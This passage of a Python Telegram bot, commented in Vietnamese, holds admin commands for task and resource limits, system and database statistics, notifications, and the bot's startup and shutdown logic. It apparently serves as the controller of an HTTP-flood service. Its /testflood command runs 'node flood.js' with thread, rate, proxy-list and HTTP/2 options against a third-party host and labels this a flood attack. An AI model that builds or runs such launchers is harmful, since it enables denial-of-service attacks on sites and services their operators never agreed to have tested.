            f"• Thời gian tối đa: {resource_manager.limits.MAX_TASK_DURATION//60} phút\n"
            f"• Tin nhắn/phút: {resource_manager.limits.MAX_MESSAGES_PER_MINUTE}\n"
            f"• CPU tối đa: {resource_manager.limits.MAX_CPU_PERCENT}%\n"
            f"• RAM tối đa: {resource_manager.limits.MAX_RAM_PERCENT}%"
        )
        
        # Thêm thông tin chi tiết về tác vụ của user hiện tại
        user_tasks = []
        for (uid, cid, task_key), proc in running_tasks.items():
            if uid == message.from_user.id and proc and proc.poll() is None:
                user_tasks.append(f"• {task_key} (PID: {proc.pid})")
        
        if user_tasks:
            resource_text += f"\n\n📋 *TÁC VỤ CỦA BẠN:*\n" + "\n".join(user_tasks)
        
        sent = bot.reply_to(message, resource_text, parse_mode='Markdown')
        auto_delete_response(message.chat.id, message.message_id, sent, delay=30)
        
    except Exception as e:
        logger.error(f"/resources error: {e}")
        sent = bot.reply_to(message, "❌ Lỗi khi lấy thông tin tài nguyên.")
        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

@bot.message_handler(commands=['setlimits'])
@ignore_old_messages
@not_banned
@admin_required
@resource_limit
@log_command
def cmd_setlimits(message):
    """Thay đổi giới hạn tài nguyên (chỉ admin)"""
    try:
        args = message.text.split()
        if len(args) < 3:
            help_text = (
                "⚠️ *Cách sử dụng:*\n"
                "`/setlimits <type> <value>`\n\n"
                "📋 *Các loại giới hạn:*\n"
                "• `user_tasks` - Số tác vụ tối đa/user\n"
                "• `global_tasks` - Số tác vụ tối đa toàn hệ\n"
                "• `task_duration` - Thời gian tối đa tác vụ (phút)\n"
                "• `messages_per_min` - Tin nhắn tối đa/phút\n"
                "• `cpu_limit` - Giới hạn CPU (%)\n"
                "• `ram_limit` - Giới hạn RAM (%)\n\n"
                "💡 *Ví dụ:*\n"
                "`/setlimits user_tasks 5`\n"
                "`/setlimits cpu_limit 90`"
            )
            sent = bot.reply_to(message, help_text, parse_mode='Markdown')
            auto_delete_response(message.chat.id, message.message_id, sent, delay=20)
            return
        
        limit_type = args[1].lower()
        try:
            value = float(args[2])
        except ValueError:
            sent = bot.reply_to(message, "❌ Giá trị phải là số!")
            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
            return
        
        # Cập nhật giới hạn
        if limit_type == 'user_tasks':
            if value < 1 or value > 10:
                sent = bot.reply_to(message, "❌ Số tác vụ/user phải từ 1-10!")
                auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
                return
            resource_manager.limits.MAX_CONCURRENT_TASKS_PER_USER = int(value)
            sent = bot.reply_to(message, f"✅ Đã cập nhật giới hạn tác vụ/user: {int(value)}")
            
        elif limit_type == 'global_tasks':
            if value < 5 or value > 50:
                sent = bot.reply_to(message, "❌ Số tác vụ toàn hệ phải từ 5-50!")
                auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
                return
            resource_manager.limits.MAX_CONCURRENT_TASKS_GLOBAL = int(value)
            sent = bot.reply_to(message, f"✅ Đã cập nhật giới hạn tác vụ toàn hệ: {int(value)}")
            
        elif limit_type == 'task_duration':
            if value < 5 or value > 1440:
                sent = bot.reply_to(message, "❌ Thời gian tác vụ phải từ 5-1440 phút!")
                auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
                return
            resource_manager.limits.MAX_TASK_DURATION = int(value * 60)
            sent = bot.reply_to(message, f"✅ Đã cập nhật thời gian tối đa tác vụ: {int(value)} phút")
            
        elif limit_type == 'messages_per_min':
            if value < 5 or value > 100:
                sent = bot.reply_to(message, "❌ Tin nhắn/phút phải từ 5-100!")
                auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
                return
            resource_manager.limits.MAX_MESSAGES_PER_MINUTE = int(value)
            sent = bot.reply_to(message, f"✅ Đã cập nhật giới hạn tin nhắn/phút: {int(value)}")
            
        elif limit_type == 'cpu_limit':
            if value < 50 or value > 95:
                sent = bot.reply_to(message, "❌ Giới hạn CPU phải từ 50-95%!")
                auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
                return
            resource_manager.limits.MAX_CPU_PERCENT = value
            sent = bot.reply_to(message, f"✅ Đã cập nhật giới hạn CPU: {value}%")
            
        elif limit_type == 'ram_limit':
            if value < 50 or value > 95:
                sent = bot.reply_to(message, "❌ Giới hạn RAM phải từ 50-95%!")
                auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
                return
            resource_manager.limits.MAX_RAM_PERCENT = value
            sent = bot.reply_to(message, f"✅ Đã cập nhật giới hạn RAM: {value}%")
            
        else:
            sent = bot.reply_to(message, "❌ Loại giới hạn không hợp lệ!")
            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
            return
        
        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
        
    except Exception as e:
        logger.error(f"/setlimits error: {e}")
        sent = bot.reply_to(message, "❌ Lỗi khi cập nhật giới hạn.")
        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)



@bot.message_handler(commands=['systemstatus'])
@ignore_old_messages
@not_banned
@admin_required
@resource_limit
@log_command
def cmd_systemstatus(message):
    """Hiển thị trạng thái chi tiết của hệ thống - Đã được tối ưu hóa"""
    try:
        # Lấy thông tin tài nguyên
        res_status = resource_manager.get_resource_status()
        
        # Lấy thông tin hệ thống
        uptime = get_uptime()
        system_info = get_system_info_text()
        
        # Đếm tác vụ theo loại với tối ưu hóa
        task_types = {}
        for (uid, cid, task_key), proc in running_tasks.items():
            if proc and proc.poll() is None:
                task_types[task_key] = task_types.get(task_key, 0) + 1
        
        # Lấy performance analytics
        perf_analytics = res_status.get('performance_analytics', {})
        
        # Tạo báo cáo chi tiết với thông tin mới
        status_text = (
            f"🔧 *TRẠNG THÁI HỆ THỐNG CHI TIẾT*\n\n"
            f"⏰ *Thời gian:*\n"
            f"• Uptime: {uptime}\n"
            f"• Thời gian hiện tại: {datetime.now().strftime('%H:%M:%S %d/%m/%Y')}\n\n"
            f"🖥️ *Tài nguyên:*\n{system_info}\n\n"
            f"📊 *Quản lý tác vụ:*\n"
            f"• Tác vụ toàn hệ: {res_status['global_tasks']}/{res_status['max_global_tasks']}\n"
            f"• Tác vụ của bạn: {res_status['user_tasks'].get(message.from_user.id, 0)}/{res_status['max_user_tasks']}\n"
            f"• Tác vụ active: {res_status['active_tasks']}\n"
            f"• DB Connections: {res_status.get('db_connections', 0)}/{res_status.get('max_db_connections', 0)}\n\n"
            f"🔄 *Phân loại tác vụ:*\n"
        )
        
        if task_types:
            for task_type, count in task_types.items():
                status_text += f"• {task_type}: {count}\n"
        else:
            status_text += "• Không có tác vụ nào đang chạy\n"
        
        # Thêm performance analytics
        if perf_analytics and 'status' not in perf_analytics:
            status_text += (
                f"\n📈 *PHÂN TÍCH HIỆU SUẤT:*\n"
                f"• CPU trung bình: {perf_analytics.get('avg_cpu', 0)}%\n"
                f"• RAM trung bình: {perf_analytics.get('avg_ram', 0)}%\n"

                f"• Số record: {perf_analytics.get('total_records', 0)}\n"
            )
        
        status_text += (
            f"\n⚙️ *Cấu hình giới hạn:*\n"
            f"• Tác vụ/user: {res_status['max_user_tasks']}\n"
            f"• Tác vụ toàn hệ: {res_status['max_global_tasks']}\n"
            f"• Thời gian tối đa: {resource_manager.limits.MAX_TASK_DURATION//60} phút\n"
            f"• Tin nhắn/phút: {resource_manager.limits.MAX_MESSAGES_PER_MINUTE}\n"
            f"• CPU tối đa: {resource_manager.limits.MAX_CPU_PERCENT}%\n"
            f"• RAM tối đa: {resource_manager.limits.MAX_RAM_PERCENT}%\n"
            f"• Memory cleanup threshold: {resource_manager.limits.MEMORY_CLEANUP_THRESHOLD}%\n"
            f"• GC interval: {resource_manager.limits.GARBAGE_COLLECTION_INTERVAL//60} phút\n\n"
            f"💚 *Trạng thái:* Hệ thống hoạt động ổn định"
        )
        
        sent = bot.reply_to(message, status_text, parse_mode='Markdown')
        auto_delete_response(message.chat.id, message.message_id, sent, delay=45)
        
    except Exception as e:
        logger.error(f"/systemstatus error: {e}")
        sent = bot.reply_to(message, "❌ Lỗi khi lấy trạng thái hệ thống.")
        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

@bot.message_handler(commands=['performance'])
@ignore_old_messages
@not_banned
@admin_required
@resource_limit
@log_command
def cmd_performance(message):
    """Hiển thị phân tích hiệu suất chi tiết"""
    try:
        # Lấy performance analytics
        perf_analytics = resource_manager.get_performance_analytics()
        
        if 'status' in perf_analytics:
            sent = bot.reply_to(message, "ℹ️ Chưa có dữ liệu hiệu suất để phân tích.")
            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
            return
        
        # Tạo báo cáo performance
        perf_text = (
            f"📊 *PHÂN TÍCH HIỆU SUẤT CHI TIẾT*\n\n"
            f"🖥️ *CPU:*\n"
            f"• Trung bình: {perf_analytics['avg_cpu']}%\n"
            f"• Trung bình: {perf_analytics['current_cpu']}%\n\n"
            f"🧠 *RAM:*\n"
            f"• Trung bình: {perf_analytics['current_ram']}%\n\n"
            f"📈 *Thống kê:*\n"
            f"• Tổng record: {perf_analytics['total_records']}\n"
            f"• Thời gian phân tích: Real-time\n\n"
            f"💡 *Gợi ý:*\n"
        )
        
        # Thêm gợi ý dựa trên dữ liệu
        if perf_analytics['current_cpu'] > 70:
            perf_text += "• CPU sử dụng cao - cân nhắc giảm tải\n"
        elif perf_analytics['current_ram'] > 75:
            perf_text += "• RAM sử dụng cao - cần cleanup memory\n"
        else:
            perf_text += "• Hệ thống hoạt động tốt - không cần thay đổi\n"
        
        sent = bot.reply_to(message, perf_text, parse_mode='Markdown')
        auto_delete_response(message.chat.id, message.message_id, sent, delay=30)
        
    except Exception as e:
        logger.error(f"/performance error: {e}")
        sent = bot.reply_to(message, "❌ Lỗi khi lấy phân tích hiệu suất.")
        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

@bot.message_handler(commands=['dbstats'])
@ignore_old_messages
@not_banned
@admin_required
@resource_limit
@log_command
def cmd_dbstats(message):
    """Hiển thị thống kê hiệu suất database"""
    try:
        # Lấy database performance stats
        db_stats = db.get_performance_stats()
        
        # Tạo báo cáo database
        db_text = (
            f"🗄️ *DATABASE PERFORMANCE STATS*\n\n"
            f"📊 *Query Statistics:*\n"
            f"• Tổng queries: {db_stats['total_queries']:,}\n"
            f"• Slow queries (>100ms): {db_stats['slow_queries']:,}\n"
            f"• Cache hits: {db_stats['cache_hits']:,}\n"
            f"• Cache misses: {db_stats['cache_misses']:,}\n"
            f"• Cache hit rate: {db_stats['cache_hit_rate']:.1f}%\n\n"
            f"🔗 *Connection Pool:*\n"
            f"• Active connections: {db_stats['active_connections']}\n"
            f"• Batch operations pending: {db_stats['batch_operations_pending']}\n\n"
            f"⏰ *Timing:*\n"
            f"• Last maintenance: {datetime.fromtimestamp(db_stats['last_maintenance']).strftime('%H:%M:%S')}\n"
            f"• Last batch commit: {datetime.fromtimestamp(db_stats['last_batch_commit']).strftime('%H:%M:%S')}\n\n"
        )
        
        # Thêm gợi ý tối ưu hóa
        if db_stats['cache_hit_rate'] < 50:
            db_text += "💡 *Gợi ý:* Cache hit rate thấp - cần tăng cache size\n"
        elif db_stats['slow_queries'] > db_stats['total_queries'] * 0.1:
            db_text += "💡 *Gợi ý:* Nhiều slow queries - cần tối ưu hóa indexes\n"
        else:
            db_text += "💡 *Gợi ý:* Database hoạt động tốt\n"
        
        sent = bot.reply_to(message, db_text, parse_mode='Markdown')
        auto_delete_response(message.chat.id, message.message_id, sent, delay=30)
        
    except Exception as e:
        logger.error(f"/dbstats error: {e}")
        sent = bot.reply_to(message, "❌ Lỗi khi lấy thống kê database.")
        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

@bot.message_handler(commands=['optimize'])
@ignore_old_messages
@not_banned
@admin_required
@resource_limit
@log_command
def cmd_optimize(message):
    """Tối ưu hóa hệ thống tự động"""
    try:
        # Thực hiện các tối ưu hóa
        optimizations = []
        
        # 1. Memory cleanup
        try:
            import gc
            before = len(gc.get_objects())
            gc.collect()
            after = len(gc.get_objects())
            freed = before - after
            optimizations.append(f"🗑️ Memory cleanup: Giải phóng {freed} objects")
        except Exception as e:
            optimizations.append(f"❌ Memory cleanup failed: {e}")
        
        # 2. Log file cleanup
        try:
            resource_manager._cleanup_log_files()
            optimizations.append("📝 Log files cleaned up")
        except Exception as e:
            optimizations.append(f"❌ Log cleanup failed: {e}")
        
        # 3. Database optimization
        try:
            # Sử dụng database maintenance mới
            if hasattr(db, '_perform_maintenance'):
                db._perform_maintenance()
                optimizations.append("🗄️ Database maintenance completed (VACUUM + ANALYZE + WAL cleanup)")
            else:
                # Fallback to manual optimization
                with db.get_connection() as conn:
                    conn.execute('VACUUM')
                    conn.execute('ANALYZE')
                optimizations.append("🗄️ Database optimized (VACUUM + ANALYZE)")
        except Exception as e:
            optimizations.append(f"❌ Database optimization failed: {e}")
        

        
        # Tạo báo cáo tối ưu hóa
        optimize_text = (
            f"🔧 *TỐI ƯU HÓA HỆ THỐNG*\n\n"
            f"📋 *Các bước đã thực hiện:*\n"
        )
        
        for opt in optimizations:
            optimize_text += f"• {opt}\n"
        
        optimize_text += (
            f"\n📊 *Trạng thái sau tối ưu hóa:*\n"
            f"• CPU: {psutil.cpu_percent(interval=0.1):.1f}%\n"
            f"• RAM: {psutil.virtual_memory().percent:.1f}%\n"

        )
        
        sent = bot.reply_to(message, optimize_text, parse_mode='Markdown')
        auto_delete_response(message.chat.id, message.message_id, sent, delay=25)
        
    except Exception as e:
        logger.error(f"/optimize error: {e}")
        sent = bot.reply_to(message, f"❌ Lỗi khi tối ưu hóa: {str(e)[:100]}...")
        auto_delete_response(message.chat.id, message.message_id, sent, delay=15)

@bot.message_handler(commands=['autonotify'])
@ignore_old_messages
@not_banned
@admin_required
@log_command
def cmd_autonotify(message):
    """Quản lý hệ thống thông báo tự động"""
    global auto_notification_enabled
    try:
        # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
        processing_msg = bot.reply_to(message, "🔄 Đang xử lý lệnh /autonotify...")
        
        # Xóa tin nhắn lệnh sau khi đã gửi thông báo
        delete_message_immediately(message.chat.id, message.message_id)
        
        args = message.text.split()
        if len(args) < 2:
            # Hiển thị trạng thái hiện tại
            status_text = (
                f"📊 *TRẠNG THÁI THÔNG BÁO TỰ ĐỘNG*\n\n"
                f"🔔 Trạng thái: {'✅ Bật' if auto_notification_enabled else '❌ Tắt'}\n"
                f"⏰ Chu kỳ: {auto_notification_interval//60} phút\n"
                f"💬 Số chat nhận thông báo: {len(auto_notification_chats)}\n"
                f"🔄 Tác vụ đang chạy: {sum(1 for proc in running_tasks.values() if proc and proc.poll() is None)}\n\n"
                f"📋 *Cách sử dụng:*\n"
                f"`/autonotify on` - Bật thông báo tự động\n"
                f"`/autonotify off` - Tắt thông báo tự động\n"
                f"`/autonotify add` - Thêm chat này vào danh sách nhận thông báo\n"
                f"`/autonotify remove` - Xóa chat này khỏi danh sách nhận thông báo\n"
                f"`/autonotify test` - Gửi thông báo test ngay lập tức"
            )
            
            bot.edit_message_text(status_text, chat_id=message.chat.id, message_id=processing_msg.message_id, parse_mode='Markdown')
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=30)
            return
        
        action = args[1].lower()
        chat_id = message.chat.id
        
        if action == 'on':
            if auto_notification_enabled:
                bot.edit_message_text("ℹ️ Hệ thống thông báo tự động đã được bật rồi!", 
                                    chat_id=message.chat.id, message_id=processing_msg.message_id)
            else:
                auto_notification_enabled = True
                start_auto_notification()
                bot.edit_message_text("✅ Đã bật hệ thống thông báo tự động!", 
                                    chat_id=message.chat.id, message_id=processing_msg.message_id)
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
            
        elif action == 'off':
            if not auto_notification_enabled:
                bot.edit_message_text("ℹ️ Hệ thống thông báo tự động đã được tắt rồi!", 
                                    chat_id=message.chat.id, message_id=processing_msg.message_id)
            else:
                stop_auto_notification()
                bot.edit_message_text("✅ Đã tắt hệ thống thông báo tự động!", 
                                    chat_id=message.chat.id, message_id=processing_msg.message_id)
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
            
        elif action == 'add':
            add_auto_notification_chat(chat_id)
            bot.edit_message_text("✅ Đã thêm chat này vào danh sách nhận thông báo tự động!", 
                                chat_id=message.chat.id, message_id=processing_msg.message_id)
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
            
        elif action == 'remove':
            remove_auto_notification_chat(chat_id)
            bot.edit_message_text("✅ Đã xóa chat này khỏi danh sách nhận thông báo tự động!", 
                                chat_id=message.chat.id, message_id=processing_msg.message_id)
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
            
        elif action == 'test':
            # Gửi thông báo test ngay lập tức
            test_msg = (
                f"🧪 *THÔNG BÁO TEST*\n"
                f"⏰ Thời gian: {datetime.now().strftime('%H:%M:%S %d/%m/%Y')}\n"
                f"💚 Hệ thống thông báo tự động hoạt động bình thường!\n"
                f"🔄 Sẽ gửi thông báo tiếp theo sau {auto_notification_interval//60} phút"
            )
            bot.edit_message_text(test_msg, chat_id=message.chat.id, message_id=processing_msg.message_id, parse_mode='Markdown')
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
            
        else:
            bot.edit_message_text("❌ Hành động không hợp lệ. Sử dụng: on, off, add, remove, test", 
                                chat_id=message.chat.id, message_id=processing_msg.message_id)
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
            
    except Exception as e:
        logger.error(f"Error in /autonotify: {e}")
        try:
            bot.edit_message_text(f"❌ Có lỗi xảy ra: {str(e)}", 
                                chat_id=message.chat.id, 
                                message_id=processing_msg.message_id)
        except Exception:
            sent = bot.reply_to(message, f"❌ Có lỗi xảy ra: {str(e)}")
            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

# ========== Test Commands ==========

@bot.message_handler(commands=['testflood'])
@ignore_old_messages
@not_banned
@admin_required
@log_command
def cmd_testflood(message):
    """Test lệnh flood với các tham số mới"""
    try:
        # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
        processing_msg = bot.reply_to(message, "🔄 Đang test lệnh flood nâng cao...")
        delete_message_immediately(message.chat.id, message.message_id)

        # Test với tham số mặc định
        test_host = "httpbin.org"  # Safe test target
        test_time = "10"  # 10 giây
        test_threads = "2"
        test_rate = "10"
        test_method = "GET"

        # Kiểm tra file flood.js
        if not os.path.isfile('flood.js'):
            bot.edit_message_text(
                "❌ File 'flood.js' không tồn tại!",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id
            )
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
            return

        # Kiểm tra file proxy
        possible_files = ['proxies.txt', 'proxy.txt', 'proxies.lst']
        proxyfile = None
        for f in possible_files:
            if os.path.isfile(f):
                proxyfile = f
                break

        if proxyfile is None:
            bot.edit_message_text(
                "❌ Không tìm thấy file proxy để test. Vui lòng tạo file proxy.txt với ít nhất 1 proxy.",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id
            )
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
            return

        # Cập nhật thông báo test
        bot.edit_message_text(
            f"🧪 **Test Flood Attack (Nâng cao):**\n"
            f"🎯 **Target:** {test_host}\n"
            f"⏱️ **Time:** {test_time}s\n"
            f"🧵 **Threads:** {test_threads}\n"
            f"📊 **Rate:** {test_rate}/s\n"
            f"🌐 **Method:** {test_method}\n"
            f"📁 **Proxy:** {proxyfile}\n"
            f"🔧 **Options:** Query: 5, Cookie: test=123, HTTP: 2, Debug: ON\n\n"
            f"🔄 Đang chạy test...",
            chat_id=message.chat.id,
            message_id=processing_msg.message_id,
            parse_mode='Markdown'
        )

        # Xây dựng command test với các tham số nâng cao
        cmd = [
            'node', 'flood.js',
            test_method, test_host, test_time, test_threads, test_rate, proxyfile,
            '--query', '5',
            '--cookie', 'test=123',
            '--http', '2',
            '--debug'
        ]

        logger.info(f"Testing flood.js với các tham số: {cmd}")

        # Chạy test
        run_subprocess_async(cmd, message.from_user.id, message.chat.id, 'flood_test', message)

        # Tự động xóa thông báo sau 25 giây
        auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=25)

    except Exception as e:
        logger.error(f"Error in /testflood: {e}")
        try:
            bot.edit_message_text(
                f"❌ Lỗi khi test flood: {e}",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id
            )
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
        except Exception:
            sent = bot.reply_to(message, f"❌ Lỗi khi test flood: {e}")
            auto_delete_response(message.chat.id, message.message_id, sent, delay=15)

# ========== Handler cho tin nhắn không được nhận diện ==========

@bot.message_handler(func=lambda message: True)
@ignore_old_messages
@not_banned
def handle_unknown_message(message):
    """Xử lý các tin nhắn không được nhận diện"""
    try:
        # Chỉ phản hồi khi là lệnh (bắt đầu bằng '/')
        if getattr(message, 'text', '') and message.text.startswith('/'):
            sent = bot.reply_to(message,
                f"❓ Lệnh `{message.text.split()[0]}` không tồn tại hoặc bạn không có quyền sử dụng.\n"
                f"💡 Sử dụng /help để xem danh sách lệnh có sẵn.")
            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
        else:
            # Bỏ qua mọi tin nhắn thường
            return
    except Exception as e:
        logger.error(f"Error handling unknown message: {e}")

# ========== Main chạy bot ==========

def main():
    """Main function với tối ưu hóa performance và memory management"""
    
    # Thiết lập start_time trước
    bot.start_time = datetime.now()
    logger.info(f"🤖 Bot khởi động với token bắt đầu bằng: {Config.TOKEN[:10]}")
    
    # Kiểm tra dependencies
    check_dependencies()
    
    # Kiểm tra token hợp lệ
    try:
        bot_info = bot.get_me()
        logger.info(f"✅ Bot connected successfully: @{bot_info.username}")
    except Exception as e:
        logger.error(f"❌ Invalid bot token or connection failed: {e}")
        sys.exit(1)
    
    # Khởi động hệ thống quản lý tài nguyên với tối ưu hóa
    try:
        resource_manager.start_monitoring()
        logger.info("🔧 Hệ thống quản lý tài nguyên đã được khởi động")
        
        # Thêm performance monitoring
        logger.info(f"⚙️ Resource limits: CPU={resource_manager.limits.MAX_CPU_PERCENT}%, "
                   f"RAM={resource_manager.limits.MAX_RAM_PERCENT}%, "
                   f"Tasks={resource_manager.limits.MAX_CONCURRENT_TASKS_GLOBAL}")
    except Exception as e:
        logger.error(f"❌ Không thể khởi động hệ thống quản lý tài nguyên: {e}")
    
    # Khởi động hệ thống thông báo tự động
    try:
        start_auto_notification()
        logger.info("🔔 Hệ thống thông báo tự động đã được khởi động")
    except Exception as e:
        logger.error(f"❌ Không thể khởi động hệ thống thông báo tự động: {e}")
    
    # Tối ưu hóa bot settings
    try:
        # Giảm timeout để tăng responsiveness
        bot.threaded = True
        bot.skip_pending = True
        logger.info("🔧 Bot settings optimized for performance")
    except Exception as e:
        logger.warning(f"Could not optimize bot settings: {e}")
    
    retry_count = 0
    max_retries = 3  # Giảm từ 5 xuống 3
    
    while retry_count < max_retries:
        try:
            logger.info("🔄 Starting bot polling with optimized settings...")
            
            # Sử dụng polling với tối ưu hóa cao
            bot.infinity_polling(
                timeout=20,  # Giảm từ 30 xuống 20
                long_polling_timeout=20,  # Giảm từ 30 xuống 20
                logger_level=logging.ERROR  # Giảm log level để tăng performance
            )
            break  # Nếu polling thành công, thoát khỏi vòng lặp
            
        except ApiException as api_e:
            retry_count += 1
            logger.error(f"❌ Telegram API Error (attempt {retry_count}/{max_retries}): {api_e}")
            if retry_count >= max_retries:
                logger.error("❌ Max retries reached. Exiting...")
                break
            time.sleep(5)  # Giảm delay từ 10 xuống 5 giây
            
        except KeyboardInterrupt:
            logger.info("🛑 Bot stopped by user (KeyboardInterrupt)")
            break
            
        except Exception as e:
            retry_count += 1
            logger.error(f"❌ Unexpected error (attempt {retry_count}/{max_retries}): {e}")
            if retry_count >= max_retries:
                logger.error("❌ Max retries reached. Exiting...")
                break
            time.sleep(5)  # Giảm delay từ 10 xuống 5 giây
    
    logger.info("👋 Bot shutdown complete")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        logger.info("🛑 Bot stopped by user (KeyboardInterrupt)")
    except Exception as e:
        logger.error(f"❌ Fatal error: {e}")
    finally:
        # Cleanup tối ưu hóa
        logger.info("🧹 Starting cleanup process...")
        
        try:
            # Dừng tất cả tác vụ đang chạy
            logger.info("🛑 Stopping all running tasks...")
            if 'running_tasks' in globals() and running_tasks:
                for (uid, cid, task_key), proc in list(running_tasks.items()):
                    if proc and proc.poll() is None:
                        try:
                            if os.name == 'nt':
                                proc.terminate()
                            else:
                                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                            logger.info(f"Stopped task: {task_key}")
                        except Exception as e:
                            logger.warning(f"Could not stop task {task_key}: {e}")
            else:
                logger.info("No running tasks to stop")
            
            # Dừng hệ thống quản lý tài nguyên
            resource_manager.stop_monitoring()
            logger.info("🔧 Resource management system stopped")
            
            # Dừng hệ thống thông báo tự động
            stop_auto_notification()
            logger.info("🔔 Auto notification system stopped")

            # Dừng executor với timeout ngắn hơn
            logger.info("🔄 Shutting down thread executor...")
            executor.shutdown(wait=True, timeout=5)  # Giảm từ 10 xuống 5 giây
            logger.info("🧵 Thread executor stopped")

            # Đóng database connections
            logger.info("🗄️ Closing database connections...")
            db.close_all_connections()
            logger.info("🗄️ Database connections closed")

            # Force garbage collection với tối ưu hóa
            logger.info("🗑️ Running final garbage collection...")
            try:
                import gc
                # Tối ưu hóa GC
                gc.set_threshold(100, 5, 5)  # Giảm threshold
                collected = gc.collect()
                logger.info(f"🗑️ Garbage collection completed: {collected} objects collected")
            except Exception as e:
                logger.warning(f"Garbage collection failed: {e}")

            # Cleanup log handlers với tối ưu hóa
            logger.info("📝 Cleaning up log handlers...")
            for handler in logger.handlers[:]:
                try:
                    handler.close()
                    logger.removeHandler(handler)
                except Exception as e:
                    logger.warning(f"Could not close log handler: {e}")

            logger.info("✅ Optimized cleanup completed successfully")
            
        except Exception as e:
            logger.error(f"❌ Error during cleanup: {e}")
        
        # Final exit
        logger.info("👋 Bot shutdown complete")
        sys.exit(0)


